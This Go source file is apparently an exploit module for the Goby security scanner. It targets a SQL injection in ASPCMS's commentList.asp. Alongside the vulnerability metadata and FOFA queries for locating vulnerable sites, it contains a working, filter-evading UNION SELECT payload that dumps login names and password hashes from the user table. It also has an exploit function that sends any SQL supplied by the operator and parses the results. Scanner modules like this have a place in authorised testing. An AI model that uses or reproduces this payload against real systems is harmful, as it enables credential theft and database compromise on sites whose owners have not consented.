package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ASPCMS commentList.asp SQLi",
    "Description": "The ASPCMS system is not strict in filtering the data parameters submitted by visitors, so the attacker can submit the constructed SQL statement to query the database at any time to obtain sensitive information.",
    "Impact": "ASPCMS commentList.asp SQLi",
    "Recommendation": "<p>1. the data input by users should be strictly filtered in the web code.</p><p>2. deploy web application firewall to monitor database operation.</p><p>3. upgrade to the latest version.</p>",
    "Product": "ASPCMS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "aspcms commentList.asp sql注入",
            "Description": "aspcms commentList.asp sql注入",
            "Impact": "<p>黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。<br></p>",
            "Recommendation": "<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1.在网页代码中需要对用户输入的数据进行严格过滤。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2.部署Web应用防火墙，对数据库操作进行监控&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3.升级至最新版本</p>",
            "Product": "ASPCMS",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ASPCMS commentList.asp SQLi",
            "Description": "The ASPCMS system is not strict in filtering the data parameters submitted by visitors, so the attacker can submit the constructed SQL statement to query the database at any time to obtain sensitive information.",
            "Impact": "ASPCMS commentList.asp SQLi",
            "Recommendation": "<p>1. the data input by users should be strictly filtered in the web code.</p><p>2. deploy web application firewall to monitor database operation.</p><p>3. upgrade to the latest version.</p>",
            "Product": "ASPCMS",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(title=\"Powered by ASPCMS\" || body=\"content=\\\"ASPCMS\" || body=\"/inc/AspCms_AdvJs.asp\")",
    "GobyQuery": "(title=\"Powered by ASPCMS\" || body=\"content=\\\"ASPCMS\" || body=\"/inc/AspCms_AdvJs.asp\")",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.aspcms.com/",
    "DisclosureDate": "2021-06-16",
    "References": [
        "https://www.safeinfo.me/2019/07/22/aspcms-lou-dong-ji-he.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom {prefix}user",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10205"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/plug/comment/commentList.asp"
			payload := "?id=-1 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom {prefix}user"
			uri = fmt.Sprintf("%s%s", uri, strings.Replace(payload, " ", "%20", -1))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "IP") && strings.Contains(resp.Utf8Html, `class="line2"`)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/plug/comment/commentList.asp"
			cmd := ss.Params["cmd"].(string)
			payload := fmt.Sprintf("?id=-1 %s", cmd)
			uri = fmt.Sprintf("%s%s", uri, strings.Replace(payload, " ", "%20", -1))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Success = true
					line1 := regexp.MustCompile(`<div class="line1"><span>(.*?)</div>`).FindStringSubmatch(resp.Utf8Html)[1]
					line1 = strings.Replace(line1, `</span>`, "", -1)
					line2 := regexp.MustCompile(`<div class="line2">(.*?)</div>`).FindStringSubmatch(resp.Utf8Html)[1]
					expResult.Output = fmt.Sprintf("%s\n%s", line1, line2)
				}
			}
			return expResult
		},
	))
}
